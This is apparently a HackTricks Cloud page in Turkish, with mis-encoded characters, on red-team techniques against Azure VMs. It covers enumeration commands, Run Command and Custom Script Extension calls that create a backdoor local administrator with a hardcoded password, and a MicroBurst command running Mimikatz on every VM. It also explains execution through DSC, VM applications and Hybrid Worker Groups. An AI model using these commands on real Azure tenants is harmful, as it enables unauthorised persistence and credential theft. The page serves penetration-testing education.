# Az - Sanal Makineler ve AÄŸ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel bilgiler

[DokÃ¼mantasyondan:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure sanal makineler, Azure'Ä±n sunduÄŸu birkaÃ§ tÃ¼rden biridir. Genellikle, diÄŸer seÃ§eneklerin sunmadÄ±ÄŸÄ± ÅŸekilde hesaplama ortamÄ± Ã¼zerinde daha fazla kontrol istediÄŸinizde sanal makine seÃ§ersiniz. Bu makale, bir sanal makine oluÅŸturmadan Ã¶nce dikkate almanÄ±z gereken bilgileri, nasÄ±l oluÅŸturacaÄŸÄ±nÄ±zÄ± ve nasÄ±l yÃ¶neteceÄŸinizi size sunar.

## Azure AÄŸ Bilgisi

Azure aÄŸlarÄ±, **farklÄ± varlÄ±klar ve yapÄ±landÄ±rma yÃ¶ntemleri iÃ§erir.** FarklÄ± Azure aÄŸ varlÄ±klarÄ±nÄ±n kÄ±sa **aÃ§Ä±klamalarÄ±nÄ±**, **Ã¶rneklerini** ve **sÄ±ralama** komutlarÄ±nÄ± aÅŸaÄŸÄ±daki baÄŸlantÄ±da bulabilirsiniz:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**, Azure portalÄ± Ã¼zerinden SSL Ã¼zerinden gÃ¼venli, tamamen yÃ¶netilen bir RDP (Uzak MasaÃ¼stÃ¼ ProtokolÃ¼) ve SSH (GÃ¼venli Kabuk) eriÅŸim Ã§Ã¶zÃ¼mÃ¼ sunar. Azure Sanal AÄŸÄ± iÃ§inde entegre edilmiÅŸtir ve Ã¶zel IP'leri kullanarak VM'lere RDP ve SSH baÄŸlantÄ±sÄ± saÄŸlar, bÃ¶ylece genel IP atamalarÄ± ve VM eriÅŸimi iÃ§in NSG kural yapÄ±landÄ±rmalarÄ±yla ilgili geleneksel yÃ¶ntemlere gÃ¶re daha gÃ¼venli ve kullanÄ±ÅŸlÄ± bir alternatif oluÅŸturur. GeliÅŸtiriciler ve BT personeli, web tarayÄ±cÄ±larÄ±nÄ± kullanarak Azure portalÄ±ndan VM'lere gÃ¼venli bir ÅŸekilde eriÅŸebilir, bu da geliÅŸtirme ve test ortamlarÄ± iÃ§in sÃ¼reci kolaylaÅŸtÄ±rÄ±r.

AboneliÄŸinizdeki tÃ¼m Azure Bastion SunucularÄ±nÄ± listelemek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Sanal Makine Saptama
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Bir sanal makinede komut Ã§alÄ±ÅŸtÄ±rma**

### **VM'de AAD Oturumu AÃ§ma**

AzureAD Ã¼zerinden kimlik doÄŸrulamasÄ± yapÄ±lan kullanÄ±cÄ±lara eriÅŸim izni vermek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, bir **Linux VM'ye** eriÅŸmeye Ã§alÄ±ÅŸÄ±rken `ssh username@azure-corp.com@1.1.1.1` (oturum aÃ§maya Ã§alÄ±ÅŸÄ±rken kullanÄ±lan azurecorp ile birlikte **e-postayÄ± kullanmak Ã¶nemlidir**) gibi bir hata alabilirsiniz:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Sadece **bu talimatlarÄ± takip edin** [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) adresine gidin ve kodu belirtin, kimlik bilgileri olarak e-posta ve ÅŸifreyi kullanÄ±n ve SSH Ã¼zerinden baÄŸlantÄ± kurabilirsiniz (bu kullanÄ±cÄ±nÄ±n yapabilmesi iÃ§in yeterli izinlere sahipse: `Virtual Machine Administrator Login` veya `Virtual Machine User Login` rolÃ¼).

### **Komut Ã‡alÄ±ÅŸtÄ±r**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ã–zel Komut UzantÄ±sÄ± Ã‡alÄ±ÅŸtÄ±rma**

Azure sanal makine (VM) uzantÄ±larÄ±, **kÃ¼Ã§Ã¼k uygulamalar** olup, **Azure VM'lerinde** daÄŸÄ±tÄ±m sonrasÄ± yapÄ±landÄ±rma ve otomasyon **gÃ¶revleri** saÄŸlar. Ã–rneÄŸin, bir sanal makine yazÄ±lÄ±m kurulumu, antivirÃ¼s korumasÄ± veya iÃ§inde bir komut dosyasÄ± Ã§alÄ±ÅŸtÄ±rma yeteneÄŸi gerektiriyorsa, bir VM uzantÄ±sÄ± kullanabilirsiniz.

Bu nedenle, yazma eriÅŸiminiz varsa, keyfi kodu yÃ¼rÃ¼tebilirsiniz:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC), Ansible'ye benzer bir PowerShell aracÄ±dÄ±r ve bir ana bilgisayarÄ± kod aracÄ±lÄ±ÄŸÄ±yla yapÄ±landÄ±rmak iÃ§in kullanÄ±lÄ±r. DSC, Azure ile entegre olur ve belirli yapÄ±landÄ±rma dosyalarÄ±nÄ±n yÃ¼klenmesine izin verir. Bu dosyalar katÄ± bir sÃ¶zdizimine uymalÄ±dÄ±r. Ã–zellikle, Azure'daki DSC uzantÄ±sÄ±, belirli biÃ§imlendirme kriterlerini karÅŸÄ±layan dosyalardan komutlarÄ± yÃ¼rÃ¼tebilir, hatta DSC standartlarÄ± iÃ§in doÄŸru olmayan bir sÃ¶zdizimine sahip olsalar bile. Bu durum, saÄŸlanan ÅŸekilde gÃ¶sterildiÄŸi gibi.

Bu komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi, Az PowerShell'deki [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) iÅŸlevi tarafÄ±ndan kolaylaÅŸtÄ±rÄ±lÄ±r. Gereksinimler arasÄ±nda tanÄ±mlÄ± bir iÅŸleve sahip bir **.PS1** dosyasÄ± ve dosyanÄ±n bir **.zip** dosyasÄ±na sÄ±kÄ±ÅŸtÄ±rÄ±lmasÄ± bulunur. DSC iÃ§in sÃ¶zdizimi doÄŸru olmasa bile, kod hala yÃ¼rÃ¼tÃ¼lÃ¼r. Ancak, uzantÄ± yÃ¼rÃ¼tme durumunu "baÅŸarÄ±sÄ±zlÄ±k" olarak iÅŸaretler ve baÅŸarÄ±sÄ±zlÄ±k mesajÄ± tarafÄ±ndan Ã¼zerine yazÄ±ldÄ±ÄŸÄ± iÃ§in komuttan herhangi bir Ã§Ä±ktÄ± gÃ¶rÃ¼ntÃ¼lenmez.

### VM Uygulama TanÄ±mlarÄ±

VM Uygulama TanÄ±mlarÄ±, bir Azure VM'ye sÃ¼rÃ¼mlendirilmiÅŸ uygulamalarÄ±n tekrarlanabilir bir ÅŸekilde daÄŸÄ±tÄ±lmasÄ±nÄ± saÄŸlar. Bu kaynak, VM'ler arasÄ±nda uygulamalarÄ±n daÄŸÄ±tÄ±mÄ±nÄ± ve gÃ¼ncellenmesini destekler. Bunun iÃ§in **`New-AzGalleryApplication`** ve **`New-AzGalleryApplicationVersion`** gibi komutlarla birkaÃ§ adÄ±m gereklidir.

Bu yÃ¶ntemle uygulamalarÄ±n veya komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi, uygulama bir VM'ye uygulandÄ±ÄŸÄ±nda otomatik olarak yÃ¼klenen **"VMAppExtension"** tarafÄ±ndan gerÃ§ekleÅŸtirilir. UzantÄ±, belirtilen URI'den dosyayÄ± alÄ±r ve uygulama adÄ±yla, uzantÄ±sÄ±z olarak adlandÄ±rÄ±r. DosyanÄ±n doÄŸru ÅŸekilde yÃ¼rÃ¼tÃ¼lmesi iÃ§in REST API Ã§aÄŸrÄ±sÄ±ndaki "ManageActions" alanÄ±nÄ±n dosyayÄ± uygun uzantÄ±yla yeniden adlandÄ±rmasÄ± gerekmektedir. Bu yÃ¶ntemin kurulumu tamamlandÄ±ÄŸÄ±nda, saÄŸlanan ÅŸekilde gÃ¶sterilen yapÄ±ya benzeyecektir.

Ancak, bu yÃ¼rÃ¼tme yÃ¶ntemi nispeten yavaÅŸtÄ±r ve bir uygulamanÄ±n veya komutun yÃ¼rÃ¼tÃ¼lmesi yaklaÅŸÄ±k 3-4 dakika sÃ¼rer. Bu iÅŸleme iliÅŸkin dosyalar, uygulama kopyasÄ± iÃ§in `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` ve yÃ¼rÃ¼tme durumu iÃ§in `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` dizinlerinde depolanÄ±r.

Her iki teknik de Azure ortamlarÄ±nda komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi ve uygulamalarÄ±n daÄŸÄ±tÄ±lmasÄ± iÃ§in benzersiz yÃ¶ntemler sunar, her birinin kendi gereksinimleri, adÄ±mlarÄ± ve dikkate alÄ±nmasÄ± gereken noktalarÄ± vardÄ±r.

### Azure'da Hybrid Worker Groups (HWG)

[**Hybrid Worker Groups (HWG)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker), bir Automation HesabÄ±nda yapÄ±landÄ±rÄ±lan Runbook'larÄ±n, belirlenen HWG'nin bir parÃ§asÄ± olan bir Azure Sanal Makinesi (VM) Ã¼zerinde yÃ¼rÃ¼tÃ¼lmesine olanak tanÄ±yan bir Ã¶zelliktir. Bu yÃ¼rÃ¼tme, VM Ã¼zerine Runbook kodunu daÄŸÄ±tan bir uzantÄ± tarafÄ±ndan kolaylaÅŸtÄ±rÄ±lÄ±r. Bu sÃ¼recin Ã¶nemli bir yÃ¶nÃ¼, gerÃ§ek kimlik bilgilerinin yÃ¼rÃ¼tmede bir faktÃ¶r olmamasÄ±dÄ±r Ã§Ã¼nkÃ¼ kod, Ã¶zellikle **SYSTEM** veya root olarak yÃ¼kseltilmiÅŸ ayrÄ±calÄ±klarla Ã§alÄ±ÅŸÄ±r, saÄŸlanan ÅŸekilde gÃ¶sterildiÄŸi gibi.

Windows 10 VM'lerini kullananlar iÃ§in Ã¶nemli bir ayrÄ±ntÄ±, Runbook iÃ§in PowerShell sÃ¼rÃ¼mÃ¼nÃ¼ belirtme gerekliliÄŸidir. PowerShell SÃ¼rÃ¼mÃ¼nÃ¼n 7.1 yerine 5.1 olarak ayarlanmasÄ± gerekmektedir. Bu gereklilik, PowerShell 7.1'in bu VM'lerde varsayÄ±lan olarak yÃ¼klÃ¼ olmamasÄ±ndan kaynaklanÄ±r ve 7.1 sÃ¼rÃ¼mÃ¼ belirtilirse betik yÃ¼rÃ¼tmesinde bir hata oluÅŸur.

Azure'Ä±n bu Ã¶zelliÄŸi, hibrit ortamlarda gÃ¶revleri otomatikleÅŸtirmek ve yÃ¶netmek iÃ§in gÃ¼Ã§lÃ¼ bir yÃ¶ntem sunar, Azure VM'lerinde merkezi yÃ¶netim ve gÃ¶rev yÃ¼rÃ¼tme imkanÄ± saÄŸlar.

## Referanslar

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin.
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
